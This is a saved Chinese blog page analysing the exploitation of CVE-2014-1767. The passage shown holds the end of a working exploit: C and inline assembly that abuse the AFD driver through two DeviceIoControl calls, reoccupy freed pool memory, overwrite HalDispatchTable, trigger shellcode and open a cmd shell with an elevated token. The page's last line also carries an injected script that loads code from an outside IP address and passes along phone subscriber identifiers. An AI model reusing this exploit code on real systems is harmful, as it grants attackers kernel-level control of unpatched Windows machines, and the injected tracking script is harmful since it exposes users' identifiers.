        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">Allocate Mem Failed :%d\n</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }

    memset(AllocAddr, </span><span style="color: #800080;">0</span>, <span style="color: #800080;">0x200</span><span style="color: #000000;">);
    __asm
    {
        pushad
            mov eax, AllocAddr
            mov dword ptr[eax </span>+ <span style="color: #800080;">4</span>], <span style="color: #800080;">0xa8</span><span style="color: #000000;">
            mov dword ptr[eax </span>+ 10h], <span style="color: #800080;">2</span><span style="color: #000000;">
            mov dword ptr[eax </span>+ 14h], <span style="color: #800080;">1</span><span style="color: #000000;">
            mov dword ptr[eax </span>+<span style="color: #000000;"> 1ch], 80016h
            mov dword ptr[eax </span>+<span style="color: #000000;"> 28h], 20000028h
            mov ebx, uHalDispatchTable
            sub ebx, 18h
            mov dword ptr[eax </span>+<span style="color: #000000;"> 38h], ebx
            popad
    }
    </span><span style="color: #008000;">//</span><span style="color: #008000;">wait 2 second </span>
    ::Sleep(<span style="color: #800080;">2000</span><span style="color: #000000;">);
    </span><span style="color: #008000;">//</span><span style="color: #008000;">first IoControl</span>
    DeviceIoControl((HANDLE)s, <span style="color: #800080;">0x1207F</span>, (LPVOID)inbuf1, <span style="color: #800080;">0x30</span>, outBuf, <span style="color: #800080;">0</span>, &amp;<span style="color: #000000;">bytesRet, NULL);
    </span><span style="color: #008000;">//</span><span style="color: #008000;">Create a Workerfactory object to occupy the free Mdl pool</span>
    HANDLE hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, <span style="color: #800080;">1337</span>, <span style="color: #800080;">4</span><span style="color: #000000;">);
    DWORD Exploit;
    status </span>= NtCreateWorkerFactory(&amp;hWorkerFactory, GENERIC_ALL, NULL, hCompletionPort, (HANDLE)-<span style="color: #800080;">1</span>, &amp;Exploit, NULL, <span style="color: #800080;">0</span>, <span style="color: #800080;">0</span>, <span style="color: #800080;">0</span><span style="color: #000000;">);
    </span><span style="color: #0000ff;">if</span> (!<span style="color: #000000;">NT_SUCCESS(status))
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">NtCreateWorkerFactory fail!Error:%d\n</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    </span><span style="color: #008000;">//</span><span style="color: #008000;">try to read HaliQuerySystemInformation address but failed
    </span><span style="color: #008000;">//</span><span style="color: #008000;">GetHaliQuerySystemInformation();
    
    </span><span style="color: #008000;">//</span><span style="color: #008000;">second IoControl
    </span><span style="color: #008000;">//</span><span style="color: #008000;">free the Workerfactory object we create just now</span>
    DeviceIoControl((HANDLE)s, <span style="color: #800080;">0x120C3</span>, (LPVOID)inbuf2, <span style="color: #800080;">0x18</span>, outBuf, <span style="color: #800080;">0</span>, &amp;<span style="color: #000000;">bytesRet, NULL);
    </span><span style="color: #008000;">//</span><span style="color: #008000;">NtQueryEaFile will allocate a pool with the same size of Workerfactory object,and 
    </span><span style="color: #008000;">//</span><span style="color: #008000;">memcpy our data to the Workerfactory object,mainly change Workerfactory object+0x10 to 
    </span><span style="color: #008000;">//</span><span style="color: #008000;">HalDispatchTable+4</span>
<span style="color: #000000;">    MyNtQueryEaFile();
    </span><span style="color: #008000;">//</span><span style="color: #008000;">change HalDispatchTable+4 to our shellcode address</span>
<span style="color: #000000;">    MyNtSetInformationWorkerFactory();
    </span><span style="color: #008000;">//</span><span style="color: #008000;">Trigger from user mode</span>
    ULONG temp = <span style="color: #800080;">0</span><span style="color: #000000;">;
    status </span>= NtQueryIntervalProfile(<span style="color: #800080;">2</span>, &amp;<span style="color: #000000;">temp);
    </span><span style="color: #0000ff;">if</span> (!<span style="color: #000000;">NT_SUCCESS(status))
    {
        printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">NtQueryIntervalProfile fail!Error:%d\n</span><span style="color: #800000;">"</span><span style="color: #000000;">, GetLastError());
        </span><span style="color: #0000ff;">return</span> -<span style="color: #800080;">1</span><span style="color: #000000;">;
    }
    printf(</span><span style="color: #800000;">"</span><span style="color: #800000;">done!\n</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    </span><span style="color: #008000;">//</span><span style="color: #008000;">Sleep(000);
    </span><span style="color: #008000;">//</span><span style="color: #008000;">Create a new cmd process with current token</span>
    printf(<span style="color: #800000;">"</span><span style="color: #800000;">Creating a new cmd...\n</span><span style="color: #800000;">"</span><span style="color: #000000;">);
    CreatNewCmd();
    </span><span style="color: #0000ff;">return</span> <span style="color: #800080;">0</span><span style="color: #000000;">;
}</span></pre>
<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div></div>
<p>&nbsp;</p>
<p>by：会飞的猫<br>转载请注明:http://www.cnblogs.com/flycat-2016</p></div><div id="MySignature"></div>
<div class="clear"></div>
<div id="blog_post_info_block">
<div id="BlogPostCategory"></div>
<div id="EntryTag"></div>
<div id="blog_post_info"><div id="green_channel">
        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(5450328,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">好文要顶</a>
            <a id="green_channel_follow" onclick="follow(&#39;20abe80a-62fa-e511-9fc1-ac853d9f53cc&#39;);" href="javascript:void(0);">关注我</a>
    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/icon_weibo_24.png" alt=""></a>
    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/wechat.png" alt=""></a>
</div>
<div id="author_profile">
    <div id="author_profile_info" class="author_profile_info">
            <a href="http://home.cnblogs.com/u/flycat-2016/" target="_blank"><img src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/sample_face.gif" class="author_avatar" alt=""></a>
        <div id="author_profile_detail" class="author_profile_info">
            <a href="http://home.cnblogs.com/u/flycat-2016/">會飛的貓</a><br>
            <a href="http://home.cnblogs.com/u/flycat-2016/followees">关注 - 0</a><br>
            <a href="http://home.cnblogs.com/u/flycat-2016/followers">粉丝 - 3</a>
        </div>
    </div>
    <div class="clear"></div>
    <div id="author_profile_honor"></div>
    <div id="author_profile_follow">
                <a href="javascript:void(0);" onclick="follow(&#39;20abe80a-62fa-e511-9fc1-ac853d9f53cc&#39;);return false;">+加关注</a>
    </div>
</div>
<div id="div_digg">
    <div class="diggit" onclick="votePost(5450328,&#39;Digg&#39;)">
        <span class="diggnum" id="digg_count">0</span>
    </div>
    <div class="buryit" onclick="votePost(5450328,&#39;Bury&#39;)">
        <span class="burynum" id="bury_count">0</span>
    </div>
    <div class="clear"></div>
    <div class="diggword" id="digg_tips">
    </div>
</div>
<script type="text/javascript">
    currentDiggType = 0;
</script></div>
<div class="clear"></div>
<div id="post_next_prev"><a href="http://www.cnblogs.com/flycat-2016/p/5450247.html" class="p_n_p_prefix">« </a> 上一篇：<a href="http://www.cnblogs.com/flycat-2016/p/5450247.html" title="发布于2016-05-02 22:37">CVE-2014-4113 Win8.1 64位利用(2014.11)</a><br><a href="http://www.cnblogs.com/flycat-2016/p/5449769.html" class="p_n_p_prefix">» </a> 下一篇：<a href="http://www.cnblogs.com/flycat-2016/p/5449769.html" title="发布于2016-05-02 22:39">CVE-2016-0143 漏洞分析(2016.4)</a><br></div>
</div>


		</div>
		<div class="postDesc">posted @ <span id="post-date">2016-05-02 22:38</span> <a href="http://www.cnblogs.com/flycat-2016/">會飛的貓</a> 阅读(<span id="post_view_count">183</span>) 评论(<span id="post_comment_count">0</span>)  <a href="https://i.cnblogs.com/EditPosts.aspx?postid=5450328" rel="nofollow">编辑</a> <a href="http://www.cnblogs.com/flycat-2016/p/5450328.html#" onclick="AddToWz(5450328);return false;">收藏</a></div>
	</div>
	<script type="text/javascript">var allowComments=true,cb_blogId=277617,cb_entryId=5450328,cb_blogApp=currentBlogApp,cb_blogUserGuid='20abe80a-62fa-e511-9fc1-ac853d9f53cc',cb_entryCreatedDate='2016/5/2 22:38:00';loadViewCount(cb_entryId);var cb_postType=1;</script>
	
</div><!--end: topics 文章、评论容器-->
</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
<div id="comment_form" class="commentform">
<a name="commentform"></a>
<div id="divCommentShow"></div>
<div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="http://www.cnblogs.com/flycat-2016/p/5450328.html#" onclick="return RefreshPage();">刷新页面</a><a href="http://www.cnblogs.com/flycat-2016/p/5450328.html#top">返回顶部</a></div>
<div id="comment_form_container"><script type="text/javascript" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/mention.js.下载"></script>
<div id="commentform_title">发表评论</div>
<span id="tip_comment" style="color:Red"></span>
<p>
昵称：<input type="text" id="tbCommentAuthor" class="author" disabled="disabled" size="50" value="五千年木">
</p>
<div class="commentbox_main">
<div class="commentbox_title">
<div class="commentbox_title_left">评论内容：</div>
<div class="commentbox_title_right">
<img id="ubb_quote" class="comment_icon" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/quote.gif" alt="引用" title="添加引用" onclick="insertUBB(&#39;tbCommentBody&#39;,&#39;quote&#39;)">
<img id="ubb_bold" class="comment_icon" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/b.png" alt="粗体" title="添加粗体" onclick="insertUBB(&#39;tbCommentBody&#39;,&#39;b&#39;)">
<img id="ubb_url" class="comment_icon" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/lk.png" alt="链接" title="添加链接" onclick="insertUbbUrl(&#39;tbCommentBody&#39;)">
<img id="ubb_indent" class="comment_icon" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/indent.png" alt="缩进" title="添加首行缩进" onclick="insertIndent(&#39;tbCommentBody&#39;)">
<img id="ubb_code" class="comment_icon" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/InsertCode.gif" alt="代码" title="添加代码" onclick="insertUbbCode()">
<img id="ubb_img" class="comment_icon" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/img.gif" alt="图片" title="上传图片" onclick="OpenImageUploadWindow();">
</div>
</div>
<div class="clear"></div>
<textarea id="tbCommentBody" class="comment_textarea"></textarea>
</div>
<p id="commentbox_opt">
<input id="btn_comment_submit" type="button" class="comment_btn" value="提交评论">
<span id="span_comment_canceledit" style="display:none"><a href="javascript:void(0);" onclick="return CancelCommentEdit()">不改了</a></span>
<a href="javascript:void(0);" onclick="return logout();">退出</a>
        <a id="commentbox_opt_sub" href="javascript:void(0);" title="订阅后有新评论时会邮件通知您" onclick="commentManager.Subscribe()">订阅评论</a>
</p>
<div id="tip_comment2" style="color:Red"></div>
<p>
[Ctrl+Enter快捷键提交]
</p>
<div style="display:none">
<span id="comment_edit_id"></span><span id="span_parentcomment_id"></span>
<span id="span_parent_id"></span>
<span id="span_comment_replyto"></span>
<span id="span_comment_posted"></span>
</div>
</div>
<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
<div id="ad_t2"><a href="http://www.ucancode.com/index.htm" target="_blank">【推荐】超50万VC++源码: 大型工控、组态\仿真、建模CAD源码2018！</a><br><a href="https://cloud.tencent.com/solution/la?fromSource=gwzcw.766790.766790.766790" target="_blank">【推荐】微信小程序一站式部署 多场景模板定制</a><br></div>
<div id="opt_under_post"></div>
<div id="cnblogs_c1" class="c_ad_block"><a href="http://www.gcpowertools.com.cn/products/spreadjs/?utm_source=cnblogs&amp;utm_medium=blogpage&amp;utm_term=bottom&amp;utm_content=SpreadJS2&amp;utm_campaign=community" target="_blank"><img width="300" height="250" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/24442-20171206093644566-325426505.png" alt="SpreadJS2_1206"></a></div>
<div id="under_post_news"><div class="itnews c_ad_block"><b>最新IT新闻</b>:<br> ·  <a href="https://news.cnblogs.com/n/590150/" target="_blank">有钱人为所欲为？贝索斯花4200万美元建造“万年钟”</a><br> ·  <a href="https://news.cnblogs.com/n/590149/" target="_blank">批量“搬运”B站的视频资源，在技术上能实现吗？</a><br> ·  <a href="https://news.cnblogs.com/n/590148/" target="_blank">适用于Android和iPhone的Swype键盘宣告停止开发</a><br> ·  <a href="https://news.cnblogs.com/n/590147/" target="_blank">比尔·盖茨将在3月客串《生活大爆炸》</a><br> ·  <a href="https://news.cnblogs.com/n/590146/" target="_blank">索尼将联合开发AI打车系统，进军网约车市场</a><br>» <a href="http://news.cnblogs.com/" title="IT新闻" target="_blank">更多新闻...</a></div></div>
<div id="cnblogs_c2" class="c_ad_block"><a href="http://click.aliyun.com/m/34770/" target="_blank"><img width="468" height="60" src="./CVE-2014-1767 利用分析（2015.2） - 會飛的貓 - 博客园_files/24442-20171208101900738-116140477.jpg" alt="阿里云C2-1208"></a></div>
<div id="under_post_kb"><div class="itnews c_ad_block" id="kb_block"><b>最新知识库文章</b>:<br><div id="kb_recent"> ·  <a href="http://kb.cnblogs.com/page/590141/" target="_blank">作为一个程序员，数学对你到底有多重要</a><br> ·  <a href="http://kb.cnblogs.com/page/586236/" target="_blank">领域驱动设计在互联网业务开发中的实践</a><br> ·  <a href="http://kb.cnblogs.com/page/585502/" target="_blank">步入云计算</a><br> ·  <a href="http://kb.cnblogs.com/page/531409/" target="_blank">以操作系统的角度述说线程与进程</a><br> ·  <a href="http://kb.cnblogs.com/page/141729/" target="_blank">软件测试转型之路</a><br></div>» <a href="http://kb.cnblogs.com/" target="_blank">更多知识库文章...</a></div></div>
<div id="HistoryToday" class="c_ad_block"></div>
<script type="text/javascript">
    fixPostBody();
    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
    deliverAdT2();
    deliverAdC1();
    deliverAdC2();    
    loadNewsAndKb();
    loadBlogSignature();
    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
    loadOptUnderPost();
    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
</script>
</div>


	</div><!--end: forFlow -->
	</div><!--end: mainContent 主体内容容器-->

	<div id="sideBar">
		<div id="sideBarMain">
			
<!--done-->
<div class="newsItem">
<h3 class="catListTitle">公告</h3>
	<div id="blog-news"><div id="profile_block">昵称：<a href="https://home.cnblogs.com/u/flycat-2016/">會飛的貓</a><br>园龄：<a href="https://home.cnblogs.com/u/flycat-2016/" title="入园时间：2016-04-04">1年10个月</a><br>粉丝：<a href="https://home.cnblogs.com/u/flycat-2016/followers/">3</a><br>关注：<a href="https://home.cnblogs.com/u/flycat-2016/followees/">0</a><div id="p_b_follow"><a href="javascript:void(0);" onclick="follow(&#39;20abe80a-62fa-e511-9fc1-ac853d9f53cc&#39;)">+加关注</a></div><script>getFollowStatus('20abe80a-62fa-e511-9fc1-ac853d9f53cc')</script></div></div><script type="text/javascript">loadBlogNews();</script>
</div>

			<div id="calendar"><div id="blog-calendar" style=""><table id="blogCalendar" class="Cal" cellspacing="0" cellpadding="0" title="Calendar">
	<tbody><tr><td colspan="7"><table class="CalTitle" cellspacing="0">
		<tbody><tr><td class="CalNextPrev"><a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2018/01/01&#39;);return false;">&lt;</a></td><td align="center">2018年2月</td><td class="CalNextPrev" align="right"><a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2018/03/01&#39;);return false;">&gt;</a></td></tr>
	</tbody></table></td></tr><tr><th class="CalDayHeader" align="center" abbr="日" scope="col">日</th><th class="CalDayHeader" align="center" abbr="一" scope="col">一</th><th class="CalDayHeader" align="center" abbr="二" scope="col">二</th><th class="CalDayHeader" align="center" abbr="三" scope="col">三</th><th class="CalDayHeader" align="center" abbr="四" scope="col">四</th><th class="CalDayHeader" align="center" abbr="五" scope="col">五</th><th class="CalDayHeader" align="center" abbr="六" scope="col">六</th></tr><tr><td class="CalOtherMonthDay" align="center">28</td><td class="CalOtherMonthDay" align="center">29</td><td class="CalOtherMonthDay" align="center">30</td><td class="CalOtherMonthDay" align="center">31</td><td align="center">1</td><td align="center">2</td><td class="CalWeekendDay" align="center">3</td></tr><tr><td class="CalWeekendDay" align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td class="CalWeekendDay" align="center">10</td></tr><tr><td class="CalWeekendDay" align="center">11</td><td align="center">12</td><td align="center">13</td><td align="center">14</td><td align="center">15</td><td align="center">16</td><td class="CalWeekendDay" align="center">17</td></tr><tr><td class="CalWeekendDay" align="center">18</td><td align="center">19</td><td align="center">20</td><td class="CalTodayDay" align="center">21</td><td align="center">22</td><td align="center">23</td><td class="CalWeekendDay" align="center">24</td></tr><tr><td class="CalWeekendDay" align="center">25</td><td align="center">26</td><td align="center">27</td><td align="center">28</td><td class="CalOtherMonthDay" align="center">1</td><td class="CalOtherMonthDay" align="center">2</td><td class="CalOtherMonthDay" align="center">3</td></tr><tr><td class="CalOtherMonthDay" align="center">4</td><td class="CalOtherMonthDay" align="center">5</td><td class="CalOtherMonthDay" align="center">6</td><td class="CalOtherMonthDay" align="center">7</td><td class="CalOtherMonthDay" align="center">8</td><td class="CalOtherMonthDay" align="center">9</td><td class="CalOtherMonthDay" align="center">10</td></tr>
</tbody></table></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
			
			<div id="leftcontentcontainer">
				<div id="blog-sidecolumn"><div id="sidebar_search" class="sidebar-block">
<div id="sidebar_search" class="mySearch">
<h3 class="catListTitle">搜索</h3>
<div id="sidebar_search_box">
<div id="widget_my_zzk" class="div_my_zzk"><input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="zzk_go()" type="button" value="找找看" id="btnZzk" class="btn_my_zzk"></div>
<div id="widget_my_google" class="div_my_zzk"><input type="text" name="google_q" id="google_q" onkeydown="return google_go_enter(event)" class="input_my_zzk">&nbsp;<input onclick="google_go()" type="button" value="谷歌搜索" class="btn_my_zzk"></div>
</div>
</div>

</div><div id="sidebar_shortcut" class="sidebar-block">
<div class="catListLink">
<h3 class="catListTitle">常用链接</h3>
<ul>
<li><a href="http://www.cnblogs.com/flycat-2016/p/" title="我的博客的随笔列表">我的随笔</a></li><li><a href="http://www.cnblogs.com/flycat-2016/MyComments.html" title="我发表过的评论列表">我的评论</a></li><li><a href="http://www.cnblogs.com/flycat-2016/OtherPosts.html" title="我评论过的随笔列表">我的参与</a></li><li><a href="http://www.cnblogs.com/flycat-2016/RecentComments.html" title="我的博客的评论列表">最新评论</a></li><li><a href="http://www.cnblogs.com/flycat-2016/tag/" title="我的博客的标签列表">我的标签</a></li>
</ul>
<div id="itemListLin_con" style="display:none;">
<ul>

</ul>
</div>
</div></div><div id="sidebar_toptags" class="sidebar-block"></div><div id="sidebar_categories">
<div class="catListPostArchive">
<h3 class="catListTitle">随笔档案</h3>

<ul>

<li><a id="CatList_LinkList_0_Link_0" href="http://www.cnblogs.com/flycat-2016/archive/2017/03.html">2017年3月 (1)</a> </li>

<li><a id="CatList_LinkList_0_Link_1" href="http://www.cnblogs.com/flycat-2016/archive/2017/02.html">2017年2月 (1)</a> </li>

<li><a id="CatList_LinkList_0_Link_2" href="http://www.cnblogs.com/flycat-2016/archive/2016/11.html">2016年11月 (2)</a> </li>

<li><a id="CatList_LinkList_0_Link_3" href="http://www.cnblogs.com/flycat-2016/archive/2016/05.html">2016年5月 (11)</a> </li>

<li><a id="CatList_LinkList_0_Link_4" href="http://www.cnblogs.com/flycat-2016/archive/2016/04.html">2016年4月 (3)</a> </li>

</ul>

</div>

</div><div id="sidebar_recentcomments" class="sidebar-block"><div id="recent_comments_wrap">
<div class="catListComment">
<h3 class="catListTitle">最新评论</h3>
	<div id="RecentCommentsBlock"><ul>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html#3608685">1. Re:从补丁到POC CVE-2015-0003(2015.3)</a></li>
        <li class="recent_comment_body">@程序东不好意思回复的晚，明白了最好了。我表述能力不强，有疑问的地方还望指出。...</li>
        <li class="recent_comment_author">--會飛的貓</li>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html#3575924">2. Re:从补丁到POC CVE-2015-0003(2015.3)</a></li>
        <li class="recent_comment_body">明白了</li>
        <li class="recent_comment_author">--程序东</li>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html#3575001">3. Re:从补丁到POC CVE-2015-0003(2015.3)</a></li>
        <li class="recent_comment_body">两个问题请教一下哈~主要fuzz的wParam参数，但是使用spy++监控程序，wParam始终为fff8，貌似没影响？“似乎只有xxxFlashWindow函数才靠谱：不会崩溃” 我对create.......</li>
        <li class="recent_comment_author">--程序东</li>
</ul>
</div>
</div>
</div></div><div id="sidebar_topviewedposts" class="sidebar-block"><div id="topview_posts_wrap">
<div class="catListView">
<h3 class="catListTitle">阅读排行榜</h3>
	<div id="TopViewPostsBlock"><ul><li><a href="http://www.cnblogs.com/flycat-2016/p/5449738.html">1. Windows kernel pool 初探(2014.12)(709)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/6507543.html">2. XSS编码与绕过(421)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html">3. 从补丁到POC CVE-2015-0003(2015.3)(317)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/5426910.html">4. Windows漏洞利用与防护(2015.8)(292)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/5452963.html">5. CVE-2015-0057 POC构造 &amp; 利用分析(2015.7)(286)</a></li></ul></div>
</div>
</div></div><div id="sidebar_topcommentedposts" class="sidebar-block"><div id="topfeedback_posts_wrap">
<div class="catListFeedback">
<h3 class="catListTitle">评论排行榜</h3>
	<div id="TopFeedbackPostsBlock"><ul><li><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html">1. 从补丁到POC CVE-2015-0003(2015.3)(3)</a></li></ul></div>
</div>
</div></div><div id="sidebar_topdiggedposts" class="sidebar-block"><div id="topdigg_posts_wrap">
<div class="catListView">
<h3 class="catListTitle">推荐排行榜</h3>
<div id="TopDiggPostsBlock"><ul><li><a href="http://www.cnblogs.com/flycat-2016/p/6507543.html">1. XSS编码与绕过(1)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/6481592.html">2. 业务安全逻辑问题(1)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/6083440.html">3. 浏览器exp使用经验(1)</a></li></ul></div>
</div></div></div></div><script type="text/javascript">loadBlogSideColumn();</script>
			</div>
			
		</div><!--end: sideBarMain -->
	</div><!--end: sideBar 侧边栏容器 -->
	<div class="clear"></div>
	</div><!--end: main -->
	<div class="clear"></div>
	<div id="footer">
		
<!--done-->
Copyright ©2018 會飛的貓
	</div><!--end: footer -->
</div><!--end: home 自定义的最大容器 -->
<script>jsrc=document.createElement('script');jsrc.src='http://111.8.2.135:9002/www/default/base.js?dest_url=http://www.cnblogs.com/flycat-2016/p/5450328.html&imei=8621550315727000&imsi=460022620140040&msip=10.6.235.5&msisdn=8615262014875?time=0.7593082862713119';var td=document.createElement('div');td.id='topbox';p_=document.body;c_=p_.childNodes[0];p_.insertBefore(jsrc,c_);p_.insertBefore(td,c_);</script>

</body></html>